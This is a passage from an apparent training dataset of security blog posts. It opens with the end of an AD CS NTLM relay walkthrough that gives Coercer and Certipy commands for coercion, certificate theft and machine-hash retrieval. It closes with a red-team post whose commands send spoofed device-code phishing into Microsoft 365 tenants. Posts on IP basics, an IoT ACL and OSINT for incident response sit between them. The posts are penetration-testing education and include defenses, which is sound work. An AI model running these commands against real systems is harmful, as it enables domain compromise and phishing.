default template, but it may not be available in your target environment. \n\nStep 2: Coerce Victim Machine & Request a Certificate for Victim \n\nThere are several tools that can be used to conduct coercion attacks.  \n\nCoercer: https://github.com/p0dalirius/Coercer \n\nhttps://github.com/bats3c/ADCSPwn \n\nPetitPotam: https://github.com/topotam/PetitPotam \n\nIn this example, we will use Coercer, a Python tool that can be used to coerce Windows machines to authenticate to your machine by calling known vulnerable RPC (Remote Procedure Call) functions.  \n\ncoercer coerce \\ \n -t server01.foobar.com \\ \n -I 10.10.1.100 \\ \n -u 'billy@foobar.com' \\ \n -p \\ \n -d foobar.com \n\nCoerce Victim Machine \n\nThe error outlined in the figure above, [+] (ERROR_BAD_NETPATH), is what I like to call, \"the good error.\" This result indicates that the coercion was successful. As shown in the figure above, Coercer tried to force server01 to authenticate using multiple methods RPC methods. The tool successfully forced the victim to authenticate using the EfsRpcDecryptFileSrv method. \n\nAs shown in the figure below, the credential material was relayed through the Certipy relay that we set up earlier, to the target endpoint http://foobar-CA.foobar.com/certsrv/certfnsh.asp and a certificate was obtained for server01.  \n\nCertipy Relay Server\n\n**Troubleshooting Sidebar** \n\nIf you find yourself in a situation where Certipy returns a certificate but the object does not have identification and you cannot authenticate using the resulting PFX like the example below \u2014 \n\nCertificate Obtained Without Identification \n\nFailed to Authenticate with Certificate \n\nYou may need to use the -upn flag and specify the victim's name. For example: \n\ncertipy relay \\ \n -ca 'foobar-CA' \\ \n -template 'DomainController' \\ \n -target 'FOOBAR-CA.foobar.com' \\ \n -upn 'DC01$@foobar.com' \n\nGet Certificate for DC01$ \n\n**End Sidebar** \n\nStep 3: Impersonate Victim User \n\nOnce we've successfully Coerced the target machine server01 and relayed the credentials to obtain a certificate on behalf of server01.foobar.com, we can use the certificate to obtain the credential hash and a Kerberos ticket of the target server01 account using the Certipy auth command as shown below: \n\ncertipy auth -pfx server01.pfx \n\nWe have successfully retrieved the hash for the server01 account and can impersonate server01! \n\nGet Server01 Credentials \n\nIn summary, Certificate Authorities with web enrollment enabled are susceptible to NTLM relay attacks. In some cases, relay attacks can be performed without domain credentials. This issue could allow a user to escalate privileges in the target environment.  \n\nAdditional Things to Consider \n\nTry to coerce the domain controller (DC). I've had a lot of luck with this in the past. If you can coerce the domain controller, you can impersonate the DC and gain DCSync access to the target domain. \n\nWhen you obtain a certificate, Certipy will return the request ID or an Object SID. Take note of these values. You can use that information to revoke the certificate. \n\nA certificate is valid until the validity period ends unless the certificate is explicitly revoked. The validity period is determined by the template configuration. Using the example above, this means that we will have access to server01.foobar.com's account for the next five years, regardless of any password changes.  \n\nPrevention \n\nSo, what can we do to prevent such attacks? Here are a few steps you can take: \n\nDisable ADCS HTTP endpoints if they are not necessary \n\nIf possible, disable NTLM Authentication \n\nEnforce HTTPS and enable Extended Protection for Authentication6 \n\nEnable requirements for SMB/LDAP signing \n\nEnforce LDAP channel binding \n\nResources \n\nBHIS Blogs:\n\nhttps://www.blackhillsinfosec.com/admins-nightmare-combining-hivenightmare-serioussam-and-ad-cs-attack-paths-for-profit/ \n\nhttps://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/ \n\nhttps://www.blackhillsinfosec.com/mitm6-strikes-again-the-dark-side-of-ipv6/ \n\nhttps://www.blackhillsinfosec.com/impacket-offense-basics-with-an-azure-lab/ \n\nhttps://www.blackhillsinfosec.com/impacket-defense-basics-with-an-azure-lab/ \n\nhttps://www.blackhillsinfosec.com/a-pentesters-voyage-the-first-few-hours/ \n\nBHIS Webcasts:\n\nhttps://www.blackhillsinfosec.com/event/bhis-webcast-coercions-and-relays-the-first-cred-is-the-deepest-with-gabriel-prudhomme/ \n\nhttps://www.blackhillsinfosec.com/webcast-attack-tactics-5-zero-to-hero-attack/ \n\nAdditional Resources: \n\n[1] https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942 \n\n[2] https://github.com/ly4k/Certipy \n\n[3] https://github.com/fortra/impacket\n\nhttps://posts.specterops.io/certified-pre-owned-d95910965cd2 \n\nhttps://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf \n\nhttps://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429 \n\nhttps://social.technet.microsoft.com/wiki/contents/articles/10942.ad-cs-security-guidance.aspx \n\nhttps://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786443%28v=ws.11%29 \n\nhttps://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash \n\nhttps://www.securew2.com/blog/how-to-revoke-certificate-in-windows-ad-cs  \n\nhttps://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31 \n\nhttps://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1 \n\nhttps://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979 \n\nhttps://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b \n\nhttps://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f \n\nREAD:\n\nPART ONE\n\nPART TWO\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Unpacking the Packet: Demystifying the Internet Protocol\"\nTaxonomies: \"Informational, InfoSec 101, Serena DiPenti, internet protocol, IP, Networking\"\nCreation Date: \"Thu, 16 Nov 2023 16:57:15 +0000\"\n\nThe internet is a product of a global group effort to build an interoperable network connecting billions of devices, regardless of country, region, or manufacturer. That effort yielded hundreds of protocols defining standards for how devices communicate. The Internet Protocol (IP) is the most widely known, but myths and conspiracies have plagued it since its inception. \n\nThe myths might be widespread but are easy to dispute. Several organizations, including IEEE, IETF, and ISO, have published standards or Requests for Comments (RFCs) online. These documents can be dense with technical jargon but are a goldmine of information. The current Internet Protocol standard (RFC 791) was published in 1981. \n\nThis article intends to demystify the Internet Protocol. \n\nIf you\u2019re familiar with how physical mail delivery works, then it will be easy to understand how traffic moves through a network. For example, say you need to relocate from New York to California. Your belongings won't fit into one box, so you must divide everything into multiple boxes and slap on a destination and return address before shipping them off. \n\nThe same concept works for data moving through a network. When you send an email or stream the latest movie, that data will be transmitted with the help of the Internet Protocol (among many others). However, instead of household items, you will send a datagram, and the data is split up into packets instead of boxes. \n\nThe Internet Protocol has two main functions: addressing and fragmentation. \n\nThe source and destination will have an IP address. \n\nTwo versions of the Internet Protocol are in use today: IPv4 and IPv6. An IPv4 address is fixed length with four octets. It looks like this: 192.168.1.1. IPv4 addresses are in limited supply, and currently, there are more network-capable devices than IPv4 addresses available. Network Address Translation (NAT) and IPv6 are two solutions to help deal with IPv4 address exhaustion. \n\nThere are a few variations of NAT; one of the most common is Port Address Translation (PAT). Your internet service provider will give your home one IP address. Still, you most likely have more than one device that needs an internet connection: gaming systems, laptops, cell phones, smart TVs, Alexa, and so on. Since it is impossible for each device to have its own unique IP address, your home router will assign each one a private IP address and a port number. Your router will then send all the traffic from every device onto the public internet using its single public address assigned by the ISP. \n\nIPv6 was developed to replace IPv4 fully. IPv4 has a total of 4.3 billion addresses, and IPv6 has around 340 trillion. For various reasons, the rollout of IPv6 has been slow, but adoption is increasing. Google publishes statistics on IPv6 connectivity amongst its users. \n\nFragmentation is necessary when a datagram is too large to traverse the network. \n\nDue to various packet size limitations, the Internet Protocol must break up datagrams into an arbitrary number of pieces that can be reassembled later. \n\nAn IP packet contains two vital sections: header and data. \n\nThe IP header contains instructions for transmitting and reassembling data. The illustration below shows an IPv4 header. \n\nFigure 1: RFC 791 \n\nSummary of each header component: \n\nVersion: There are two IP versions used today, IPv4 and IPv6. The illustration above shows the format of an IPv4 header. \n\nInternet Header Length: This field indicates where the header ends, and the data begins. \n\nType of Service (ToS): While not widely used, ToS gave administrators the ability to prioritize different traffic, requesting a route that would offer low-latency, high-throughput, or highly reliable service. This component has changed over the years in different RFCs. \n\nTotal Length: Total length of the packet, including headers and data.  \n\nIdentification: If the datagram has been fragmented into multiple IP packets, each packet will contain the same 16-bit identification number to indicate they belong together. \n\nFlags: This field will indicate if and how the datagram should be fragmented. \n\nFragment Offset: This field will identify the order of the fragmented data. \n\nTime to Live: Maximum time the packet is allowed to remain on the network. This feature is necessary for preventing routing loops and congestion from packets that are unable to reach their destination. \n\nProtocol: The IP packet will be encapsulated by another transmission protocol; this field will indicate which protocol to use. \n\nHeader Checksum: Headers can change while en route (e.g., time to live) and the checksum can indicate if there is an error.  \n\nSource Address: IP address of the sender. \n\nDestination Address: IP address for the destination. \n\nOptions: Special delivery instructions. This field is disabled by default and not used often. \n\nPadding: Used to make sure the IP header has a length of 32 bits. \n\nThe Internet Assigned Numbers Authority (IANA) \n\nAlmost everyone has an IP address, but most are unfamiliar with how it's assigned. There are several common misunderstandings about IP addresses and what they can do. The internet is full of videos claiming an IP address can pinpoint someone's exact location. Location was not mentioned in the previous breakdown of how the Internet Protocol works. A packet does not contain location information or coordinates, and an IP address is just a number that is almost randomly assigned to you.  \n\nThe Internet Assigned Numbers Authority (IANA) is an organization dedicated to tracking and distributing the limited supply of IPv4 addresses. IANA delegates blocks of IP addresses to Regional Internet Registries (RIR), who then allocate those blocks to different requesting organizations across their region, such as Internet Service Providers (ISPs). Internet Service Providers then can allocate those IP addresses to their customers. This is how your home and cell phone get assigned an address, which allows you to send data across the Internet. There are five main regions: \n\nAFRINIC: Africa Region \n\nAPNIC: Asia/Pacific Region \n\nARIN: Canada, United States, and some Caribbean Islands \n\nLACNIC: Latin America and some Caribbean Islands \n\nRIPE NCC: Europe, the Middle East, and Central Asia \n\nSo, what\u2019s the deal with IP addresses and geolocating?  \n\nThere are several geolocation companies with proprietary location databases. These databases have different degrees of accuracy and conflicting data. While writing this article, WhatIsMyIPAddress shows my location as Washington, while MaxMind says Texas. There is no official and accurate database; geolocation data is all compiled by third-party companies. Geolocation data can be valuable for advertisers wanting to reach their intended audience; if your local ice cream parlor wants to advertise online, they want to reach people in their area. Geolocation data does not give exact coordinates of the user but can be accurate up to zip code. \n\nHow is the information collected? \n\nThe primary source for location information is the RIRs. Registries allow assignees to specify a country and geographical coordinate for their IP address blocks. There is no requirement to provide this information or assure its accuracy. \n\nUser-submitted data. Example, a weather website might ask for your location to provide a location-based forecast. That data can be sold to these geolocation companies.  \n\nAssociating your GPS coordinates with your IP address. \n\nGuessing location based off the internet service provider who assigned the IP address.  \n\nLocation data can be unreliable for several reasons.  \n\nUsers may be using a VPN or proxy to hide their real IP address. \n\nIP address blocks can be transferred and sold. Universities like MIT were assigned IP addresses when the idea of everyone owning a personal computer sounded like science fiction. There was no concern for address exhaustion, so address blocks were assigned liberally. Some early internet pioneers sold unused addresses once they became a hot commodity. For example, MIT sold around 8 million IP addresses to Amazon. But there are plenty of other reasons addresses might be transferred or sold off, like a company going out of business.  \n\nCompany mergers happen all the time. Large ISPs buy up smaller ISPs, which can create an interesting problem for network engineers. These mergers may result in significant network changes.  \n\nMost IP addresses are assigned dynamically and can change without the individual knowing. There are several reasons why your IP address might change. You could be assigned a new IP address when your router loses connection during a power outage or when it's reset. A new IP address will be assigned when switching internet service providers. IP addresses are recycled and reassigned to different people, possibly in a different location. \n\nThe rumors and misconceptions about location data have resulted in several issues.  \n\nARIN published a blog on their website in 2018 explaining that there is no master IP geolocation database and that they have no control over how third-party sites gather their data. The blog even cited an academic paper published in 2017 that studied the accuracy of geolocation data. The study concluded that city-level location data from ARIN should not be trusted.  \n\nIn 2016, a Kansas family sued geolocation company MaxMind after living through what their lawyer called \"digital hell.\" Police and government officials repeatedly visited the family farm to investigate various crimes, missing persons, and even a suicide attempt. Eventually, the family discovered the geolocation company MaxMind used the Kansas farm as the default location for 600 million IP addresses. The company changed the default location to a lake in Kansas, and the suit was privately settled. A different family in South Africa has a similar issue, again with MaxMind using their location by default for thousands of IP addresses. \n\nThere are many intricacies to the Internet Protocol, but hopefully this will serve as a good starting point for foundational knowledge. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Simplest and Last Internet-Only ACL Youll Ever Need\"\nTaxonomies: \"General InfoSec Tips & Tricks, How-To, Informational, Jordan Drysdale, Advice from a Help Desk Tech, Networking\"\nCreation Date: \"Thu, 30 Nov 2023 16:59:32 +0000\"\n\ntl;dr \n\nImplement this ACL using whatever network gear, cloud ACL config, or uncomplicated firewall you use to protect your networks. Our IOT devices are on 10.99.99.0/24 for this example. Also, don\u2019t use non-RFC 1918 addressing on your internal networks. Depending on your configuration, the following pseudo-logic in the format of should work universally.\n\ndeny 10.99.99.0/24 10.0.0.0/8 any \n\ndeny 10.99.99.0/24 172.16.0.0/12 any \n\ndeny 10.99.99.0/24 192.168.0.0/16 any \n\nallow 10.99.99.0/24 0.0.0.0/0 any \n\nThe Verbose Version \n\nImagine this \u2014 you are implementing a new netblock for your Roku TVs, IOT devices, and wireless guests. They all need internet access and under no circumstances do they need access to anything else. When they get a DHCP lease from your network, you should provide them with a public DNS server or two in the lease offer. Not all resolvers were created equally, but OpenDNS and a few others may offer you a bit more privacy than the others.  \n\nOnce your hosts have been provided a public IP address or two for name resolution, the following ACL will result in your TVs being blocked from accessing anything RFC-1918 in four short and sweet lines. This specific configuration will keep these hosts from accessing anything you address on standard internal network ranges.  \n\ndeny 10.99.99.0/24 10.0.0.0/8 any \n\ndeny 10.99.99.0/24 172.16.0.0/12 any \n\ndeny 10.99.99.0/24 192.168.0.0/16 any \n\nallow 10.99.99.0/24 any any \n\nThis will allow the segment to talk to any public IP address. That\u2019s it, that\u2019s all. \n\nThanks for reading,  \n\n-jd \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"OSINT for Incident Response (Part 1)\"\nTaxonomies: \"Blue Team, General InfoSec Tips & Tricks, Incident Response, Informational, Patterson Cake, OSINT\"\nCreation Date: \"Thu, 07 Dec 2023 17:00:00 +0000\"\n\nBeing a digital forensics and incident response consultant is largely about unanswered questions. When we engage with a client, they know something bad happened or is happening, but they are uncertain of the \u201chow, when, where, and why.\u201d A significant component of our job is to tease out the \u201cknown knowns,\u201d the \u201cknown unknowns,\u201d and effectively and efficiently help the client answer the following:\n\nHave we been compromised?\n\nIf \u201cyes,\u201d then:\n\nHow long have we been compromised? (\u201cdwell time\u201d)\n\nWhat accounts and systems have been impacted?What was the method of compromise? (\u201cpatient zero\u201d)\n\nWhat data was accessed and/or exfiltrated?\n\nIn several recent cases, open-source intelligence (OSINT) has been instrumental in helping to answer these questions.\n\nA compromise usually occurs because something changed, from misconfigurations to zero-day exploits to end-user behaviors, and the avenue of attack is most frequently the internet. OSINT can quickly and easily give us visibility into what the internet knows about the client organization. If the internet knows, the threat actors know, and as incident responders, we need to know!\n\nAs a DFIR consultant, an engagement begins with client contact. Based solely on that initial contact, we have some critical data points: the name of the organization, their email domain, and a timeline from which to start. Given a few minutes warning, I\u2019ll engage in OSINT before even joining that initial client call. The following stories are less about the technical \u201chow-to\u201d or the specific tools/portals than about making the point that, whether you are a consultant or an internal resource, OSINT for IR is valuable and should be part of your investigative process.\n\nCase #1: \u201c3 Days from Misconfiguration to Ransomware\u201d\n\nAs usual, the call came late Friday afternoon. Ransomware notes spewing from all network-attached printers was a fair indicator that my weekend plans were ruined, but I\u2019m getting ahead of myself! Based on the first touchpoint with the client, I knew their primary TLD (top-level domain) and jumped right into my \u201c5-minute OSINT\u201d routine. First (drum roll please!), my email enumeration secret weapon: \u201cName Server Lookup\u201d (ba-dum-bum-ching!). Yep, good \u2018ol \u201cnslookup.\u201d I just want to enumerate their mail server. Super quick and easy, from Linux or Windows, specify \u201cMX\u201d (Mail Exchanger) record type and a reliable public DNS source (Google DNS in the example below), and mash \u201cEnter!\u201d (about 15 seconds start to finish):\n\nnslookup -type=mx companydomainname.com 8.8.8.8\n\nnslookup Command Example\n\nAbout 98% of the time (I made that statistic up), I\u2019ll see something like companydomainname-com.protection.outlook.com, indicating they are using M365 for their email. Generally, I want to quickly rule out that they have self-hosted email or be prepared to talk to the client about potential impact to their M365/Azure environments, if indicated. In this specific engagement, the client appeared to have on-prem Microsoft Exchange. From an \u201cattack surface\u201d perspective, this is definitely worth noting! Super valuable? For the <15 seconds invested, worth a quick check, and I\u2019ve gained one potentially valuable clue!\n\nIf I know the client engagement is a business email compromise (BEC) case, I might stop there. If not, I\u2019ll cast a bit wider of a net by using their top-level-domain (TLD) to lookup IP address/ranges in use, pivoting to internet \u201cattack surface\u201d search engines. I like DNS Dumpster for this next step because it\u2019s quick, easy to use, and easy to interpret. I\u2019m most interested in \u201cISP-allocated\u201d IP blocks, e.g. \u201cCOMCAST-1234\u201d or \u201cLOCALISP-AS-01,\u201d as opposed to CLOUDFLARENET, MICROSOFT-CORP, etc. Not that I\u2019ll ignore the latter, but self-hosted/on-prem infrastructure seems to be the likelier devil\u2019s playground. And, of course, I\u2019ll take copious notes, screenshots, etc., of everything I learn for future reference (spoiler alert\u2026 this is important to this case!): https://dnsdumpster.com\n\nIP blocks of Interest from DNS Dumpster\n\nIf DNS Dumpster returns a long list of IP blocks, take a hint from the IP listed in the SPF portion of their TXT records for a place to start. If you\u2019re playing along, you may also note that the MX record is listed here in case you want to skip using \u201cnslookup\u201d in the future and jump right to DNS Dumpster!\n\nNext, I perused the Host (A) Records within the context of a local ISP, looking for standouts, e.g. \u201cexchange.companydomainname.com\u201d or \u201cremote.companydomainname.com.\u201d In lieu of a standout entry or two, I took a stab at the range of addresses in use by the client, e.g. \u201c10.1.0.128/25\u201d or \u201c10.1.0.129-140\u201d (that\u2019s a private address range, I\u2019m just using it as an example here) and headed to Shodan.io.\n\nIf you don\u2019t have a Shodan.io account, then you can\u2019t use search filters, which presents a bit of a challenge. But you can still search for an IP or TLD. Worst-case scenario, you can filter via an alternative, then re-visit Shodan.io with an IP of interest (see options below): https://shodan.io\n\nSample Shodan.io IP Range Search\n\nI used a range, as above, or you can use a \u201cnet:10.1.0.128/25\u201d filter. From there, I reviewed \u2018TOP PORTS\u2019 for standouts. Common ports like 80 and 443 aren\u2019t very exciting and just go in my notes. I\u2019m more interested in unusual ports or remote-access ports, like 445, 3389, or 22. In this case, I saw two that were noteworthy: 3389 (Remote Desktop Protocol) and what looked like a non-standard web-services port. Next, I clicked on port \u201c3389\u201d to see associated IP addresses, then clicked on an IP for details. It\u2019s important that you check and document the \u201clast seen\u201d dates. Copious notes and screenshots are your friend!\n\nScreenshot of \u201cOpen Port\u201d 3389 including Date Last Seen\n\nScreenshot of \u201cOpen Port\u201d 3389 including Date Last Seen\n\nSide note\u2026 Shodan.io is certainly not the only \u201cattack surface\u201d search engine option. Even if it is your go-to, I highly recommend having more than one solution (see Case Study #2). Censys and LeakIX are a couple options, both providing search capabilities without registering and a bit more functionality upon free registration:\n\nCensys.io example: https://search.censys.io \u2013 \u2018ip: [10.1.0.129 to 10.1.0.140]\u2019 or \u2018ip: 10.1.0.128/25\u2019\n\nExample IP Range Search on Censys\n\nLeakIX.net example: https://leakix.net \u201cService\u201d \u2013 ip:\u201d10.1.0.128/25\u201d\n\nExample IP Subnet Search on Leakix\n\nRemember, this is not deep-dive analysis. It should take longer to read this post than to perform the actual queries! I\u2019m just doing a quick \u201cattack surface\u201d gut check. Anything glaring? Anything that might inform further investigation? Document everything for future reference!\n\nArmed with some OSINT perspective, we kicked off the client engagement and were initially consumed with containment and eradication. A couple days into the incident, while doing some event-log analysis, I noted a significant number of \u201c4625\u201d events (indicating failed logon) from public IP sources. According to the client, this should not have been possible, as they had no publicly accessible authentication portals. Additionally, the date/times didn\u2019t line up with what we knew about the current incident. Puzzling, until I revisited my OSINT notes, which indicated \u201cRemote Desktop\u201d was open to the internet on at least one public IP address associated with the client organization. After a quick check with the client network engineers regarding public IP to private IP firewall mapping, we had a specific host to investigate. We pulled a triage collection, noted remote-access software installation at 3:00 AM from an unauthorized account, unwound the timeline from there and found \u201cpatient zero\u201d (the initial point of compromise).\n\nAs it turns out, a few days prior, the client swapped out their primary firewalls (remember the \u201csomething changed\u201d axiom), migrating and modifying previous configurations. The old configuration allowed a single, non-standard port inbound from the internet to a web-application (remember our earlier Shodan.io observations). Somehow in the translation to the new firewalls, that single inbound port \u201callow\u201d turned into a 1:1 NAT (network address translation) mapping, allowing all ports inbound, including \u201cRemote Desktop\u201d (as we noted via Shodan.io) and \u201cSMB\u201d to the web-application server. Unfortunately, these changes were made by a third party, and the client was not happy about the unintended exposure. They were keenly interested in how we discovered \u201cpatient zero,\u201d and specifically about the dates and times that \u201cthe internet\u201d became aware of this misconfiguration. Thankfully, I\u2019d grabbed screenshots of my Shodan.io forays, which helped from an external validation perspective, showing \u201cfirst seen\u201d and \u201clast seen\u201d exposure. As you might imagine, this was instrumental in client-vendor discussions about causality and culpability for this incident!\n\nFinding \u201cpatient zero\u201d can be extremely challenging, especially in a large, distributed enterprise, but it is critical to informing the remediation and recovery phases of IR. In this case, given enough time, we would have eventually discovered \u201cpatient zero,\u201d but the \u201c5-minute OSINT\u201d routine dramatically reduced time to discovery and provided invaluable context for misconfiguration timelines to the client.\n\nCase #2: \u201cMetadata and a New-Fashioned Bank Robbery\u201d\n\nIn the next installment of \u201cOSINT for IR,\u201d we\u2019ll dig a little deeper and unravel a targeted attack against a financial institution. Thanks for reading!\n\nEnjoy what you read? \n\nThen check out Patterson's webcast released the day as this blog!\n\nRapid Windows Endpoint Investigations with Velociraptor & KAPE w/ Patterson\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Spamming Microsoft 365 Like Its 1995\"\nTaxonomies: \"Phishing, Red Team, Social Engineering, Steve Borosh\"\nCreation Date: \"Thu, 14 Dec 2023 16:00:00 +0000\"\n\nI previously blogged about spoofing Microsoft 365 using the direct send feature enabled by default when creating a business 365 Exchange Online instance (https://www.blackhillsinfosec.com/spoofing-microsoft-365-like-its-1995/). Using the direct send feature, it may be possible to send emails from outside or inside of the organization to other users in the tenant \u201cby design.\u201d A \u201csmart host\u201d is created with the default Exchange Online instance at \u201ccompany.mail.protection.outlook.com\u201d. A quick nslookup company.mail.protection.outlook.com will show the IP addresses of the smart host if it exists. If a TLD is associated with the Azure tenant, the smart host may have a \u201c-TLD\u201d like company-io.mail.protection.outlook.com.\n\nIn this blog post, I will cover some default protections provided by Microsoft, show my research methodology, land some spoofed device code phishing emails in a default tenant inbox, and discuss mitigations.\n\nDefault Protections\n\nSome default protections do apply from the start, as documented here: https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spam-protection-about?view=o365-worldwide#default-anti-spam-policy.\n\nPer Microsoft\u2019s documentation:\n\nEvery organization has a built-in anti-spam policy named Default that has the following properties:\n\nThe policy is the default policy (the IsDefault property has the value True), and you can't delete the default policy.\n\nThe policy is automatically applied to all recipients in the organization, and you can't turn it off.\n\nThe policy is always applied last (the Priority value is Lowest and you can't change it).1\n\nExchange Online Protection (EOP) helps reduce junk email using proprietary spam filtering, also known as content filtering. EOP attempts to learn from known spam and phishing threats to protect end-users.\n\nEOP\u2019s spoof intelligence attempts to detect if an email was spoofed and either sends it to Junk (still making it into the user\u2019s mailbox) or sends it to Quarantine.\n\nFigure 1 - Spoof Intelligence\n\nExchange Online administrators can create policies above the default policies but may not disable them. The strictest policies are applied first.2\n\nConducting Research\n\nPreemptive disclaimer: Throughout this research, results varied due to the proprietary nature of Microsoft\u2019s email protections. An email with a \u2018from\u2019 address from a certain domain might make it to inboxes in a tenant with default protections, but not another tenant with unidentified filter tags applied. Real-world testing against domains with Exchange Online and a third-party email gateway resulted in successful spoofing, as well with varying domains that were not on an \u201callow\u201d list.\n\nOrganizations should follow similar procedures to test the efficacy of anti-spoofing and SPAM filters.\n\nTo evaluate default SPAM protections against an *.onmicrosoft.com business tenant, I used the Azure Cloud33 shell to send messages via SMTP through the target organization\u2019s Direct Send smart host \u201c.mail.protection.outlook.com\u201d.\n\nThough it is possible to use telnet (yes, I said telnet), PowerShell provides the Send-MailMessage command that wraps the connection for you.\n\nFigure 2 - Send-MailMessage\n\nYou may use an html-formatted file as a template. Note that the \u201c-Body\u201d flag takes a string format. Convert the html file into a string like so:\n\n$email = Get-Content ./email.html | Out-String\n\nTo simplify the research process, I wrote a PowerShell script to wrap Send-Mail message into an easy-to-use email defense efficacy testing tool: https://github.com/rvrsh3ll/FindIngressEmail.\n\nI used a very simple device code html template as shown below. If your target uses the Outlook desktop client application, the app will display a non \u201chref\u201d tag URL as a link, which may lower the SPAM score in some content filtering instances.\n\nFigure 3 - Device Code Template\n\nNote: The Azure Console will timeout after 20 minutes of inactivity. I suggest using \u201cStart-Job\u201d to background your command. Then, keep the terminal alive with \u201cwatch ls\u201d.\n\nIf you\u2019re testing a single target domain, you might use a command like:\n\nStart-Job -name asciiDeviceCode -ScriptBlock { Import-Module /home/rev/FindIngressEmails.ps1; Invoke-FindIngressEmail -smtpServer \u201c.mail.protection.outlook.com\" -Subject \"Microsoft 365 Session Sync Required\" -bodyFile /home/rev/DeviceCodePhish.html -fromFile /home/rev/from_domains.txt -toEmail $_ -Delay 10 -Encoding ascii}} \n\nThe first test was spoofed from noreply@globo.com to three separate default-protected Microsoft 365 tenants such as \u201cbydesign[@]REDACTED.onmicrosoft.com\u201d.\n\nFigure 4 - Target User Example\n\nFigure 5 - Sending Ascii Device Code Phish\n\nThe results started entering junk folders as seen below.\n\nFigure 6 - Ascii Device Code Phish Result\n\nThe ascii encoded email landed in two of three mailboxes\u2019 junk folders. It did not land in the \u201cbydesign@\u201d mailbox. Oddly, it was not in quarantine either.\n\nFigure 7 \u2013 Quarantine\n\nI tried the same email again from the same IP address and Cloud Shell hostname. This time with UTF32 encoding.\n\nFigure 8 - Sending UTF32 Encoded Phish\n\nThis time, the emails landed in the junk folders of all three mailboxes.\n\nFigure 9 - UTF32 Encoded Phish in Junk-1\n\nFigure 10 - UTF32 Encoded Phish in Junk-2\n\nNext, to test whether the Cloud Shell IP range had any visible effect, I restarted the shell to obtain a new IP address and re-send the emails.\n\nFigure 11 - UTF32 Encoded Phish in Junk-2\n\nNext, I changed the subject of the email and re-sent.\n\nFigure 12 - Subject Change\n\nThese emails also landed in the junk folders.\n\nI changed the encoding to UTF7 and observed the results also landing in the junk folders.\n\nFigure 13 - UTF7 Phish\n\nFigure 14 - UTF7 Encoded Email in Junk\n\nTo dive a little deeper into the why this landed in the junk folder, I used https://mha.azurewebsites.net to parse the headers.\n\nFigure 15 - Analyzing utf-7 Email Headers\n\nNext, I used this script \u2014 https://github.com/mgeeky/decode-spam-headers \u2014 to further analyze the headers. It can output a handy html file for review.\n\npython .\\decode-spam-headers.py .\\globo_header.txt -f html -o report.html \n\nThe script will identify SPAM headers.\n\nFigure 16 - Globo.com SPAM Headers\n\nUsing a different domain email from address noreply@eircom.net, I re-sent the same campaign.\n\nFigure 17 - Ascii Encoded Email from EIRCOM in Inbox\n\nThe same email template email landed in all three inboxes this time. This shows that the \u201cFrom\u201d domain\u2019s email authorization settings, such as SPF, DKIM, and DMARC, may play a significant role in Microsoft\u2019s determination of the SPAM confidence level.\n\nFigure 18 \u2013 Analyzing Ascii Headers\n\nI then parsed these headers with the python script to show the difference between the globo.com header.\n\nFigure 19 - Eircom.net SPAM Headers\n\nNotice the confidence level dropped to -1.\n\nThe emails contain a \u201cX-EOPTenantAttributedMessage\u201d header. I noticed this header did not identify the remote tenant that I sent the messages from. It identified the receiving tenant ID.\n\nFigure 20 - Tenant Attribution\n\nThese tests were performed using default tenant settings in Exchange Online Protection. Additional testing was performed against Black Hills Information Security (BHIS) ANTISOC customers using a mix of additional filters, transport rules, and third-party email gateways. In all cases where the smart host allowed sending of emails into the organization, BHIS was successful in landing device code phishing emails in the inbox of the organization. Including using \u201cKnown-Bad\u201d templates such as the original TokenTactics device code phishing template. https://github.com/rvrsh3ll/TokenTactics/blob/main/resources/example_phish.html.\n\nTo test a large number of sending domains, the FindIngressEmails.ps1 script will take a list of email addresses, one-per-line.\n\nImport-Module ./FindIngressEmails.ps1\nInvoke-FindIngressEmail -smtpServer \u201cyourclientorg.mail.protection.outlok.com\u201d -Subject \"Device Reset\" -bodyFile ./emailTemplate.html -toEmail \u201ctest.user@yourclientorg.com\u201d -Delay 15 -RetryDelay 60 \n\nLastly, I sent a few hundred of these phishes to the three tenant simultaneously.\n\nFigure 21 - 133 Inbox\n\nThe first account received 133 inbox and 207 in junk.\n\nFigure 22 - 41 Inbox\n\nThe next mailbox had 41 in the inbox and 174 in junk.\n\nFigure 23 - 5 Inbox\n\nA quick peek at https://security.microsoft.com/quarantine shows some landed in quarantine as well.\n\nFigure 24 - Quarantined Emails\n\nThe results are very inconsistent between tenants however, the test shows that the same template is interpreted differently for various, some proprietary Microsoft rules.\n\nFor Defenders\n\nUnfortunately, I haven\u2019t found a method to completely disable the smart host on Exchange Online. Since posting the original blog4 about spoofing Microsoft 365, the only effective solution I\u2019ve encountered, doubtfully exhaustive, is to secure the smart host by restricting sending emails on behalf of the organization to IP address or certificate.5\n\nClosing\n\nI hope this blog post highlights the need for Exchange Online administrators to continuously test the effectiveness of their inbound email controls and secure the Direct Send smart host from allowing arbitrary unauthenticated users from sending spoofed emails into the organization.\n\nReferences\n\n"
    },
    {
        "input": "",
        "instruction": "",
